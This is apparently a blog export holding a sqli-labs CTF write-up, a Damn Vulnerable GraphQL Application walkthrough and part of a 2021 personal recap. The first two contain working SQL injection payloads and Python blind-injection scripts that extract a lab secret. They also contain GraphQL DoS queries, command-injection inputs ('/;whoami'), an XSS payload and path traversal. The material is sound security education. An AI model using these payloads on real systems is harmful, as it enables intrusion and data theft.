Less-55和 Less54一样，只是闭合方式不一样 12?id=1) and 1=1--+?id=1) and 1=2--+ 快进到表名获取 1?id=1) and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),3--+ 列名 1?id=1) and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ZZVWJ42YS5&#x27;),3--+ 数据 1?id=1) and 1=2 union select 1,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),3--+ Less-56同Less55，闭合方式不一样 1?id=1&#x27;) and 1=2 union select 1,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),3--+ Less-57同Less56，闭合方式不一样 1?id=1&quot; and 1=2 union select 1,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),3--+ Less-58因获取结果通过代码定义的数组，数据库报错也开着，把联合注入为报错注入 获取表 1?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),0x7e),1)--+ 获取字段 1?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ZZVWJ42YS5&#x27; and table_schema=&#x27;challenges&#x27;),0x7e),1)--+ 获取key 1?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),0x7e),1)--+ Less-59闭合方式不一样，其余见Less-58 获取数据 1?id=1 and updatexml(1,concat(0x7e,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),0x7e),1)--+ Less-60闭合方式不一样，其余见Less-58 获取数据 1?id=1&quot;) and updatexml(1,concat(0x7e,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),0x7e),1)--+ Less-61闭合方式不一样，其余见Less-58 获取数据 1?id=1&#x27;)) and updatexml(1,concat(0x7e,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),0x7e),1)--+ Less-62本关联合注入和报错注入都不行了，需要进行盲注 但此关限制了只能在 130 步内注入表名和数据字段以及数据，有点难度 1.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz 常见字符及大小写已经有65个了… 首先想到二分法，但感觉也不太行 表名 12345678910111213141516171819202122232425262728import requestsdef get_data(): result = &quot;&quot; url_template = &quot;http://tari.local:8888/sqli-labs/Less-62/?id=1&#x27;) and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;challenges&#x27; limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot; chars = &#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27; try_count = 0 for i in range(1, 11): left, right = 0, len(chars) - 1 while left &lt; right: mid = (left + right) // 2 url = url_template.format(i, ord(chars[mid])) resp = requests.get(url) try_count += 1 if &quot;Your Login name&quot; in resp.text: left = mid + 1 else: right = mid result += chars[left] print(result) print(try_count)get_data()# 输出# ZZVWJ42YS5# 60 字段名 12345678910111213141516171819202122232425262728import requestsdef get_data(): result = &quot;&quot; url_template = &quot;http://tari.local:8888/sqli-labs/Less-62/?id=1&#x27;) and ascii(substr(substr((select column_name from information_schema.columns where table_name=&#x27;ZZVWJ42YS5&#x27; and table_schema=&#x27;challenges&#x27; limit 2,1),8,4),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot; chars = &#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27; try_count = 0 for i in range(1, 5): left, right = 0, len(chars) - 1 while left &lt; right: mid = (left + right) // 2 url = url_template.format(i, ord(chars[mid])) resp = requests.get(url) try_count += 1 if &quot;Your Login name&quot; in resp.text: left = mid + 1 else: right = mid result += chars[left] print(&#x27;secret_&#x27; + result) print(try_count)get_data()# 输出# secret_VRST# 24 数据 12345678910111213141516171819202122232425262728import requestsdef get_data(): result = &quot;&quot; url_template = &quot;http://tari.local:8888/sqli-labs/Less-62/?id=1&#x27;) and ascii(substr((select secret_VRST from challenges.ZZVWJ42YS5 limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot; chars = &#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27; try_count = 0 for i in range(1, 25): left, right = 0, len(chars) - 1 while left &lt; right: mid = (left + right) // 2 url = url_template.format(i, ord(chars[mid])) resp = requests.get(url) try_count += 1 if &quot;Your Login name&quot; in resp.text: left = mid + 1 else: right = mid result += chars[left] print(result) print(try_count)get_data()# 输出# 3rhRLEJ2V0XsjdlUsTCS5RJs# 145 一共花费 229次，而且还是算准了字段长度，并且知道字段名前缀的前提下 网上搜了下别人的解法，tql orz https://www.jianshu.com/p/f1811e108d58 原来还有多状态这种东西，并且虽然MySQL默认区分大小写，但在用等号 where 取列名字段时，是不区分大小写的，各种骚姿势，被秀到了… 其实也是通过 substr 每位获取，只不过获取的时候，不用把每位字符（上面二分法脚本里的 chars）一个个判断是否存在，而是通过页面返回结果来进行。但不是说这是盲注嘛？页面还是有返回具体的查询信息的，比如当 id=1时返回用户名为 Angelina（为啥不是数据库的 id 为1的用户名？因为PHP在代码层做了新数组映射），id=2时返回用户名是 Dummy，假如数据表中存在8条数据，我们把结果，假如 ASCII(SUBSTRING((select table_name from information_schema.TABLES where TABLE_SCHEMA=&#39;challenges&#39; limit 1), 1, 1)) 是 90，然后ascii可见字符在 0-128，也就是 8 位二进制足以表示。我们不用一位位去匹配字符表的每个字符（上面二分法脚本里的 chars），而是先 90 &amp; 7 (00000111) = 2， 90 &amp; 56 (00111000) = 24，90 &amp; 224 (11100000) = 64，然后3种与运算结果通过 case when 把与运算后的情况，弄成8种状态（因为只有3个1，返回只有8种结果），通过页面返回的三种状态，分别是 secure，stupid， secure ，3个状态即可知道这个字符的8位二进制组成，然后就能得出第1个字符的ascii值是90。也就是原本我们需要一个个遍历 .0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz 每个字符，根据页面返回判断是否相等，如果该表存在多于8条数据，就能变成只要3次即可获取到1个字符内容。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#!/usr/bin/python3# -*-coding:utf-8-*-import reimport requestsurl = &quot;http://tari.local:8888/sqli-labs/Less-62/index.php&quot; # 改成你的地址try_count = 0def extract_bits(query, i, j): &quot;&quot;&quot; 获取query执行结果的第 i 个（从1开始算）字符的第 j 位开始的 3 个比特 &quot;&quot;&quot; global try_count payload = &quot;&quot;&quot; &#x27;+(SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (&#123;bit_mark&#125;) WHEN &#123;0&#125; THEN 1 WHEN &#123;1&#125; THEN 2 WHEN &#123;2&#125; THEN 3 WHEN &#123;3&#125; THEN 4 WHEN &#123;4&#125; THEN 5 WHEN &#123;5&#125; THEN 6 WHEN &#123;6&#125; THEN 7 ELSE 8END)+&#x27; &quot;&quot;&quot;.format(0, 2**j, 2**(j+1), 2**(j+1) + 2**j, 2**(j+2), 2**(j+2) + 2**j, 2**(j+2) + 2**(j+1), query=query, bit_mark=2**j + 2**(j+1) + 2**(j+2), i=i) payload = re.sub(r&#x27;\\s+&#x27;, &#x27; &#x27;, payload.strip().replace(&quot;\\n&quot;, &quot; &quot;)) # print(payload) resp = requests.get(url, params=&#123;&quot;id&quot;: payload&#125;, proxies=&#123;&#x27;http&#x27;: &#x27;http://127.0.0.1:8080&#x27;&#125;) try_count += 1 info = &#123; &quot;Angelina&quot;: &quot;000&quot;, &quot;Dummy&quot;: &quot;001&quot;, &quot;secure&quot;: &quot;010&quot;, &quot;stupid&quot;: &quot;011&quot;, &quot;superman&quot;: &quot;100&quot;, &quot;batman&quot;: &quot;101&quot;, &quot;admin&quot;: &quot;110&quot;, &quot;admin1&quot;: &quot;111&quot; &#125; match = re.search(r&quot;Your Login name : (.*?)&lt;br&gt;&quot;, resp.text) assert match bits = info.get(match.group(1)) assert bits return bitsdef extract_data(query, length): res = &quot;&quot; for i in range(1, length+1): b3 = extract_bits(query, i, 0) # 00000111 b2 = extract_bits(query, i, 3) # 00111000 b1 = extract_bits(query, i, 5) # 11100000 bit = b1[:2] + b2 + b3 res += chr(int(bit, 2)) return resif __name__ == &quot;__main__&quot;: table_name = extract_data(&quot;select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27; limit 1&quot;, 10) print(&quot;table_name:&quot;, table_name) column_name = &quot;secret_&quot; + extract_data( &quot;substr((select column_name from information_schema.columns where TABLE_name=&#x27;&quot; + table_name + &quot;&#x27; limit 2,1),8,4)&quot;, 4 ) print(&quot;column_name:&quot;, column_name) secret_key = extract_data(&quot;select &quot; + column_name + &quot; from challenges.&quot; + table_name, 24) print(&quot;secret_key:&quot;, secret_key) print(&quot;Done. try_count:&quot;, try_count)# 执行结果# table_name: ZZVWJ42YS5# column_name: secret_VRST# secret_key: 3rhRLEJ2V0XsjdlUsTCS5RJs# Done. try_count: 114 过于秀～ Less-63用Less-62多状态同 Less-62 Less-64用Less-62多状态 payload 改一下闭合方式即可 123456789101112payload = &quot;&quot;&quot;SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (&#123;bit_mark&#125;) WHEN &#123;0&#125; THEN 1 WHEN &#123;1&#125; THEN 2 WHEN &#123;2&#125; THEN 3 WHEN &#123;3&#125; THEN 4 WHEN &#123;4&#125; THEN 5 WHEN &#123;5&#125; THEN 6 WHEN &#123;6&#125; THEN 7 ELSE 8END &quot;&quot;&quot;.format(0, 2**j, 2**(j+1), 2**(j+1) + 2**j, 2**(j+2), 2**(j+2) + 2**j, 2**(j+2) + 2**(j+1), query=query, bit_mark=2**j + 2**(j+1) + 2**(j+2), i=i) Less-65用Less-62多状态 payload 改一下闭合方式即可 1234567891011121314payload = &quot;&quot;&quot; \\&quot;+(SELECT CASE ASCII(SUBSTRING((&#123;query&#125;), &#123;i&#125;, 1)) &amp; (&#123;bit_mark&#125;) WHEN &#123;0&#125; THEN 1 WHEN &#123;1&#125; THEN 2 WHEN &#123;2&#125; THEN 3 WHEN &#123;3&#125; THEN 4 WHEN &#123;4&#125; THEN 5 WHEN &#123;5&#125; THEN 6 WHEN &#123;6&#125; THEN 7 ELSE 8END)+\\&quot; &quot;&quot;&quot;.format(0, 2**j, 2**(j+1), 2**(j+1) + 2**j, 2**(j+2), 2**(j+2) + 2**j, 2**(j+2) + 2**(j+1), query=query, bit_mark=2**j + 2**(j+1) + 2**(j+2), i=i) 总结虽说用sqlmap是没有灵魂的，不得不说sqlmap是一款是否优秀的开源sql注入工具，为啥说没有灵魂？纯手工刷完靶场后，发现sqlmap给我们隐藏了很多很多的注入细节，所以练习不建议使用～ 参考链接[1] https://www.sqlsec.com/2020/05/sqlilabs.html [2] https://www.cnblogs.com/lcamry/p/5763012.html [3] https://www.cnblogs.com/-qing-/p/11610385.html [4] https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"sqli-labs","slug":"ctf/sqli-labs","permalink":"https://tari.moe/categories/ctf/sqli-labs/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"sqli-labs","slug":"sqli-labs","permalink":"https://tari.moe/tags/sqli-labs/"}]},{"title":"初探 GraphQL 安全","slug":"2022/graphql-dvga","date":"2022-01-30T06:19:18.000Z","updated":"2022-02-01T04:31:50.612Z","comments":true,"path":"/p/2022/graphql-dvga/","link":"","permalink":"https://tari.moe/p/2022/graphql-dvga/","excerpt":"","text":"GraphQL 是什么GraphQL规范早在2012年[1]已在Facebook的移动端开始使用并在2015年开源，没错，与其说是一种查询语言不如说是一种规范，其嵌入到各种语言中使用，不同语言的实现和使用或多或少都有些许不多，所以觉得说是规范更为合适。 先来看一种场景，在Facebook中搜索Biden这个用户，点击进去加载主要由3部分组成：姓名头像简介粉丝、发表的内容、各个Posts的点赞评论和评论内容。我们从搜索处点击某个用户即传入的是userId，按照一般Restful API获取数据方式为：根据userId获取姓名简介头像等个人信息，然后在获取该userId下最近发表的内容id，根据每个内容id在获取内容点赞评论信息，一般涉及多个 API 请求接口 https://www.howtographql.com/basics/1-graphql-is-the-better-rest/ 如果是GraphQL，因数据经过图数据结构抽象，只需访问一次接口，即可把想要的数据查询出来 这里性能上的优势就可以体现出来了。 虽然Restful API也可以做一个接口，根据传入的userId把要查的数据查出来，不过当有其他业务场景需要在这基础上增加返回字段时，那就又需要增加一个接口，加上现在一般是前后端分离架构，后端的修改往往需要与前端协调，这里的每更改一个点涉及的沟通成本、改动引发成本在项目达到一定规模后需要一定的工作量。 如果前端能够以一种查询方式，不依赖于具体的后端API接口，首先前端不用看后端API接口文档，沟通量也会降低。而且刚刚上述加载视频评论的场景，对于API获取的数据无需在前端做很大的处理，所查即所得，那么在加载性能上，也会有很大的改善～ 于是乎，GraphQL 产生了，它是在数据存储时以把数据转换为图的形式，然后在查的时候就更高效了，还有就是前端在获取数据，调API的时，因为后端的API不是死的，他能以他想获取他仅想要具体的表具体字段，不同表不同字段的数据，查过来也不需要做什么处理，就可以用了。相当于，前端在调API接口的时候，就可以指定具体的数据表和字段，非常方便～ GraphQL 安全性问题相信这时候大家应该也知道，由于GraphQL更多是偏向于前端查询，在配置或编写不当的时候，经常容易出现全局越权或者未授权的情况发生。 当然也还有其他安全问题，跟进靶场看看先～ https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application 插一句，如果没学过GraphQL可以花1小时多丢时间跟着学学写写 https://www.youtube.com/watch?v=ZQL7tL2S0oQ ，不过里面没有提及修改和删除操作，可以尝试自己写一下，熟练一下GraphQL的编写，最后可对比一下靶场中 Python 的写法，这样食用更佳～ 指纹识别https://github.com/dolevf/graphw00f 找 graphql 路径 1python3 main.py -d -t http://tari.local:5000 识别具体指纹 1python3 main.py -f -t http://tari.local:5000/graphql 结果 12345678[*] Checking if GraphQL is available at http://tari.local:5000/graphql...[!] Found GraphQL.[*] Attempting to fingerprint...[*] Discovered GraphQL Engine: (Graphene)[!] Attack Surface Matrix: https://github.com/dolevf/graphw00f/blob/main/docs/graphene.md[!] Technologies: Python[!] Homepage: https://graphene-python.org[*] Completed. 拒绝服务 - 未限制批处理GraphQL 支持批量查询请求，先简单了解一下 Graphene，nodejs 使用的 apollo 类似，不过 Graphene 是先 core/views.py 注册路由，定义 scheme，对应的 query 有 1234567node = graphene.relay.Node.Field()pastes = graphene.List(PasteObject, public=graphene.Boolean())paste = graphene.Field(PasteObject, p_id=graphene.String())system_update = graphene.String()system_diagnostics = graphene.String(username=graphene.String(), password=graphene.String(), cmd=graphene.String())system_health = graphene.String()read_and_burn = graphene.Field(PasteObject, p_id=graphene.Int()) 第一关提示为请求 systemUpdate 查询 Graphene 的对应解析为 systemUpdate -&gt; resolve_system_update 即最终调用 resolve_system_update 方法，该方法调用 security.simulate_load 这里题目假设这个为高IO处理，所以使用了 sleep 来进行模拟，我们可以适当把 loads 改为 [20, 30, 40, 50] ，重启一下服务。 123456789def simulate_load(): loads = [20, 30, 40, 50] count = 0 limit = random.choice(loads) while True: time.sleep(0.1) count += 1 if count &gt; limit: return 这样单个请求看起来正常点，2-5秒左右。 然后普通的 query 是在单个花括号的，由于 graphql 支持批处理，可以通过列表包含各个请求，然后 graphql 同时去处理，如果都是些高IO花销请求，那就可以造成DOS了，如 12345678910POST /graphql HTTP/1.1Host: 127.0.0.1:5000User-Agent: python-requests/2.26.0Accept-Encoding: gzip, deflateAccept: */*Connection: closeContent-Length: 404Content-Type: application/json[&#123;&quot;query&quot;: &quot;query &#123;\\n systemUpdate\\n&#125;&quot;, &quot;variables&quot;: []&#125;, &#123;&quot;query&quot;: &quot;query &#123;\\n systemUpdate\\n&#125;&quot;, &quot;variables&quot;: []&#125;,&#123;&quot;query&quot;: &quot;query &#123;\\n systemUpdate\\n&#125;&quot;, &quot;variables&quot;: []&#125;, &#123;&quot;query&quot;: &quot;query &#123;\\n systemUpdate\\n&#125;&quot;, &quot;variables&quot;: []&#125;,&#123;&quot;query&quot;: &quot;query &#123;\\n systemUpdate\\n&#125;&quot;, &quot;variables&quot;: []&#125;, &#123;&quot;query&quot;: &quot;query &#123;\\n systemUpdate\\n&#125;&quot;, &quot;variables&quot;: []&#125;, &#123;&quot;query&quot;: &quot;query &#123;\\n systemUpdate\\n&#125;&quot;, &quot;variables&quot;: []&#125;] 原先一个只在 2-5秒，这时返回时间变成 25s 左右 防御方法： 高 IO schema，限制单次传入次数 一些参考 https://www.apollographql.com/blog/apollo-client/performance/batching-client-graphql-queries/ https://lab.wallarm.com/graphql-batching-attack/ 拒绝服务 - 深度递归查询在GraphQL中，查询时如果指定的两个类型存在相互引用，那么查询我们去查时就可以无限套娃最终导致指数爆炸 通过查看代码的数据模型，发现 Owner 和 Paste 存在相互引用 12345678910111213class Owner(db.Model): __tablename__ = &#x27;owners&#x27; ... paste = db.relationship(&#x27;Paste&#x27;, backref=&#x27;Owner&#x27;, lazy=&#x27;dynamic&#x27;)class Paste(db.Model): __tablename__ = &#x27;pastes&#x27; ... owner = db.relationship( Owner, backref=&#x27;pastes&#x27; ) ... 尝试套娃 12345678910111213&#123; pastes &#123; owner &#123; paste &#123; owner &#123; paste &#123; id &#125; &#125; &#125; &#125; &#125;&#125; 报错 12345678910111213&#123; &quot;errors&quot;: [ &#123; &quot;message&quot;: &quot;Cannot query field \\&quot;owner\\&quot; on type \\&quot;PasteObjectConnection\\&quot;.&quot;, &quot;locations&quot;: [ &#123; &quot;line&quot;: 5, &quot;column&quot;: 17 &#125; ] &#125; ]&#125; 找了一下代码，好像没 PasteObjectConnection 这种东西，看了下wp发现要加上 edge 和 node， https://stackoverflow.com/questions/42622912/in-graphql-whats-the-meaning-of-edges-and-node 搜了下这两个字段的含义，原来graphql为了处理分页和mutate时做了一种叫 relay 的机制。仔细看我们刚刚到报错提及 Connection ，一个 connection 由对象组成，但我们代码里好像没定义这个东西 https://docs.graphene-python.org/en/latest/relay/nodes/ 在看了一下 graphene 文档，发现类中定义了 graphene.relay.Node 即会启用 relay 分页机制 12345class PasteObject(SQLAlchemyObjectType): p_id = graphene.String(source=&#x27;id&#x27;) class Meta: model = Paste interfaces = (graphene.relay.Node, ) 关于 relay 分页机制进一步讲解可以参考：https://www.apollographql.com/blog/graphql/explaining-graphql-connections/ 也就是说，当 pastes 查询访问 paste 类型的 owner 类型时，查询的是 PasteObject 里的 owner ，里面的数据是可以访问的，此时 paste 和 owner 为一个 coneection ，而当进一步查询 owner 类型的 paste 类型时，此时变成查 PasteObjectConnection 的 owner 字段，相当于跨 connection 查询，而 PasteObjectConnection 并没有 owner 这个字段，所以就报错了。 所以跨 connection 查应该是先查 connection 边连着的 node，就是 owner 里 paste 的 id 了，也就是变成 12345678910111213&#123; pastes &#123; owner &#123; paste &#123; edges &#123; node &#123; id &#125; &#125; &#125; &#125; &#125;&#125; 返回结果正常 12345678910111213141516171819&#123; &quot;data&quot;: &#123; &quot;pastes&quot;: [ &#123; &quot;owner&quot;: &#123; &quot;paste&quot;: &#123; &quot;edges&quot;: [ &#123; &quot;node&quot;: &#123; &quot;id&quot;: &quot;UGFzdGVPYmplY3Q6MQ==&quot; &#125; &#125; ] &#125; &#125; &#125; ] &#125;&#125; 现在我们的套的层数要足够多，才能让 CPU 飙高，甚至打崩 graphql 服务，这里套了50多层，返回连接超时，但CPU占用不高，也没打崩，（nodejs 可以，不知为啥这里不行了…） 拒绝服务 - 资源密集型其实就请求不同的查询接口，看看哪个返回时间更久，然后在去请求时间花销更长的 拒绝服务 - 重复字段填充garphql 一般的查询时不会禁用重复字段，即可以填充无限个相同字段，让服务端去处理 12345678910query &#123; pastes &#123; ipAddr # 1 ipAddr # 2 ipAddr # 3 ipAddr # 4 ... ipAddr # 10,000 &#125;&#125; 但本机测试，除了延迟，和刚请求那会会有小小波动，好像没啥影响…，不过能检测禁用掉这种请求方式肯定最好，因为这里塞的更多，最终也只会返回一个字段 拒绝服务 - 重命名 bypass假如说服务端有对批处理进行限制，但未获取其重命名的在进行限制的话，可通过重命名的方式进行 bypass，这里就算是 expert 模式，也可以通过这个进行 bypass 12345query &#123; q1 :systemUpdate q2 :systemUpdate q3 :systemUpdate&#125; 这里注意 : 符号要贴着 systemUpdate ，因为靶场在中间件中的获取请求字段的方式为，他根据是否为纯数字字母来进行判断。 123def get_fields_from_query(q): fields = [k for k in q.split() if k.isalnum()] return fields 然后在 graphql 的处理中，是可以正常进行解析的。 信息泄漏 - 开启缺省模式缺省查询可以通过指定 __schema 来查询目前所支持的查询方式和查询名称 1234567query &#123; __schema &#123; queryType &#123; name &#125; mutationType &#123; name &#125; subscriptionType &#123; name &#125; &#125;&#125; 比如查询 query 不一定叫做 Query ，修改操作不一定叫做 Mutation，比如在这里，修改操作就叫做 Mutations，所以一般先查 __schema, 然后就可以查看所有数据类型和接口查询方式了 12345678910111213141516&#123; __type (name: &quot;Query&quot;) &#123; name fields &#123; name type &#123; name kind ofType &#123; name kind &#125; &#125; &#125; &#125;&#125; 具体某种类型可以通过修改为 __type (name: &quot;PasteObject&quot;) 即可查询 PasteObject 的数据结构，这样还不足以查看 mutation 的访问和 subscription 的访问，可以像下面这样 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100query IntrospectionQuery &#123; __schema &#123; queryType &#123; name &#125; mutationType &#123; name &#125; subscriptionType &#123; name &#125; types &#123; ...FullType &#125; directives &#123; name description locations args &#123; ...InputValue &#125; &#125; &#125;&#125;fragment FullType on __Type &#123; kind name description fields(includeDeprecated: true) &#123; name description args &#123; ...InputValue &#125; type &#123; ...TypeRef &#125; isDeprecated deprecationReason &#125; inputFields &#123; ...InputValue &#125; interfaces &#123; ...TypeRef &#125; enumValues(includeDeprecated: true) &#123; name description isDeprecated deprecationReason &#125; possibleTypes &#123; ...TypeRef &#125;&#125;fragment InputValue on __InputValue &#123; name description type &#123; ...TypeRef &#125; defaultValue&#125;fragment TypeRef on __Type &#123; kind name ofType &#123; kind name ofType &#123; kind name ofType &#123; kind name ofType &#123; kind name ofType &#123; kind name ofType &#123; kind name ofType &#123; kind name &#125; &#125; &#125; &#125; &#125; &#125; &#125;&#125; 可参考下链接参考各种语言禁用缺省查询 https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/ 信息泄漏 - 开发环境直接访问 http://tari.local:5000/graphiql ，因为 graphql 有一个集成等开发环境，方便调试用的 信息泄漏 - 字段提示当我们输入错误的 field 字段时，graphql 会提示与这个字段相似的字段名称 输入 123&#123; system&#125; 输出 12345678910111213&#123; &quot;errors&quot;: [ &#123; &quot;message&quot;: &quot;Cannot query field \\&quot;system\\&quot; on type \\&quot;Query\\&quot;. Did you mean \\&quot;pastes\\&quot;, \\&quot;paste\\&quot;, \\&quot;systemUpdate\\&quot; or \\&quot;systemHealth\\&quot;?&quot;, &quot;locations&quot;: [ &#123; &quot;line&quot;: 2, &quot;column&quot;: 3 &#125; ] &#125; ]&#125; 可见回显了 system 相关的一些接口 利用工具： https://github.com/nikitastupin/clairvoyance 信息泄漏 - SSRFimportPaste mutation 用到了 curl 探测主机存活 12345mutation &#123; importPaste(host: &quot;127.0.0.1&quot;, port: 80, path: &quot;/&quot;, scheme: &quot;http&quot;) &#123; result &#125;&#125; 主要是熟悉下 mutation 的请求方式 注入类 - 命令 &amp; XSS &amp; HTML注入第1个命令注入：importPaste mutation 直接使用命令拼接 12345mutation &#123; importPaste(host: &quot;127.0.0.1&quot;, port: 80, path: &quot;/;whoami&quot;, scheme: &quot;http&quot;) &#123; result &#125;&#125; 同 ssrf 熟悉下 mutation 的请求方式 第2个命令注入：postman写好挂个上游代理到burp爆破出密码（或者 graphiql 写好burp抓包均可），然后传入cmd命令执行即可 123&#123; systemDiagnostics(username: &quot;admin&quot;, password: &quot;admin123&quot;, cmd: &quot;whoami&quot;)&#125; 这里注意每次启动，password 都会从下面几个中随机选一个 1[&#x27;changeme&#x27;, &#x27;password54321&#x27;, &#x27;letmein&#x27;, &#x27;admin123&#x27;, &#x27;iloveyou&#x27;, &#x27;00000000&#x27;] XSS：在页面 Create Paste 插入XSS代码即可 1&lt;img src=1 onerror=console.log(1)&gt; HTML 注入，与XSS一样，即注入 HTML 代码 注入类 - 日志欺骗日志记录通过 Audit.create_audit_entry(gqloperation=helpers.get_opname(info.operation)) 记录日志，断点跟进 helpers.get_opname 方法，可知最终获取到的为操作名称，如果获取不到，则记录为 &quot;No Operation&quot;。比如 123query pwned &#123; systemHealth&#125; 记录为 pwned CreatePaste 通过抓包可以发现请求包为 mutation CreatePaste (.... 直接改包会发现请求解析有问题或者日志篡改不了。通过自己构造请求 1234567891011mutation nonoPaste &#123; createPaste (title: &quot;good&quot;, content: &quot;oah&quot;, public: true, burn: false) &#123; paste &#123; pId content title burn &#125; &#125; &#125; 则可以把日志篡改为 nonoPaste Emmm，其实专家模式也有点问题，虽然指定了白名单，但 1234567891011mutation getPastes &#123; createPaste (title: &quot;good&quot;, content: &quot;oaaaaah&quot;, public: true, burn: false) &#123; paste &#123; pId content title burn &#125; &#125; &#125; 这样子还是记录错日志了啊（ 认证绕过 - graphiql 界面保护 bypass1234567891011class IGQLProtectionMiddleware(object): @run_only_once def resolve(self, next, root, info, **kwargs): if helpers.is_level_hard(): raise werkzeug.exceptions.SecurityError(&#x27;GraphiQL is disabled&#x27;) cookie = request.cookies.get(&#x27;env&#x27;) if cookie and cookie == &#x27;graphiql:enable&#x27;: return next(root, info, **kwargs) raise werkzeug.exceptions.SecurityError(&#x27;GraphiQL Access Rejected&#x27;) 在 信息泄漏 - 开发环境 ，其实虽然 graphiql 页面可以访问，但其实是用不了的，如上代码段，保护方式为获取Cookie env字段是否为 graphiql:enable 查询黑名单 bypass这一关需要修改一下 core/views.py 文件，注释 OpNameProtectionMiddleware 中间件 1234567gql_middlew = [ middleware.CostProtectionMiddleware(), middleware.DepthProtectionMiddleware(), middleware.IntrospectionMiddleware(), middleware.processMiddleware(), # middleware.OpNameProtectionMiddleware()] 1234567891011121314151617class processMiddleware(object): def resolve(self, next, root, info, **kwargs): if helpers.is_level_easy(): return next(root, info, **kwargs) array_qry = [] if info.context.json is not None: if isinstance(info.context.json, dict): array_qry.append(info.context.json) for q in array_qry: query = q.get(&#x27;query&#x27;, None) if security.on_denylist(query): raise werkzeug.exceptions.SecurityError(&#x27;Query is on the Deny List.&#x27;) return next(root, info, **kwargs) 因 on_denylist 方法通过分割空白字符后拼接在判断查询是否在黑名单内 12345678910def on_denylist(query): normalized_query = &#x27;&#x27;.join(query.split()) queries = [ &#x27;query&#123;systemHealth&#125;&#x27;, &#x27;&#123;systemHealth&#125;&#x27; ] if normalized_query in queries: return True return False 当然查询为 123query good&#123; systemHealth&#125; 就会变成 querygood&#123;systemHealth&#125; 进而避开黑名单 杂项 - 目录穿越普通目录穿越 12345mutation &#123; uploadPaste(filename:&quot;../../../../../tmp/file.txt&quot;, content:&quot;hi&quot;)&#123; result &#125;&#125; 总结除了配置不当、越权或未授权，这个靶场没咋提及，tari感觉拒绝服务相对来说在GraphQL中算是比较有特色些的问题了 当然除了靶场中涉及的，还有像GraphQL注入、CSRF也是不错的姿势，不过靶场没涉及，有兴趣的通过可以戳 https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ tari也是刚接触GraphQL不久，欢迎交流～","categories":[{"name":"GraphQL","slug":"GraphQL","permalink":"https://tari.moe/categories/GraphQL/"}],"tags":[{"name":"GraphQL","slug":"GraphQL","permalink":"https://tari.moe/tags/GraphQL/"}]},{"title":"告别2021","slug":"2021/2021summury","date":"2021-12-31T14:23:14.000Z","updated":"2022-04-11T12:32:05.255Z","comments":true,"path":"/p/2021/2021summury/","link":"","permalink":"https://tari.moe/p/2021/2021summury/","excerpt":"","text":"本来想着春节在写的，看到大家都写了，跟风一下，2333 3-5月 毕设&amp;论文年后先回公司两周，实习期满3月后回校开始做毕设和写论文，因实习期间做Python代码审计较多，想着能否编写一个静态代码扫描工具提升工作效率甚至挖出多点洞，这个想法其实在去年年末就有了，开题报告也整的这个但是一直没开始，想着实习走人后开始进行。 3月6号，差不到回到学校门口就下起大雨，然后伞在实习那会，刚好放在共享单车，丢了。室友全困在饭堂，笑到我了，期间联系到个师弟前来救助，不过最后还是其中一个室友借助某熟人伞回到宿舍最后接我回去～回到宿舍第一件事就是开启我的台式，然后因为天气潮湿，我用湿布插了机箱，没干，开机显卡烧了....为我955写毕设打下良好的基础.... 最开始的一个月主要是研究 bandit 源码，看懂AST咋解析的，规则咋加载和准确（相较直接正则）判断的，插件化和整体框架，后面就开始照猫画虎写了。期间每天晚上（只要不下雨）就去跑半小时步，被室友拉去打打羽毛球，早睡早起，为我后面减肥成功打下坚实的基础！做毕设期间摸摸鱼刷刷 ctfshow，复现复现漏洞，日子过的轻松愉悦简单而充实～ 过了接近一个月，才写完核心部分，论文还没开始动开始慌了，看到同个导师的其他同学都给论文老检查，马不停蹄开始加快进度，终于在一周内把边边角角写好，后续开始对比SonarQube，Fortify 这些优秀的代码审计工具，也是为论文数据部分做准备。不得不吐槽下Fortify，扫描几十万行代码，16核+32G竟然扫了差不多24小时… 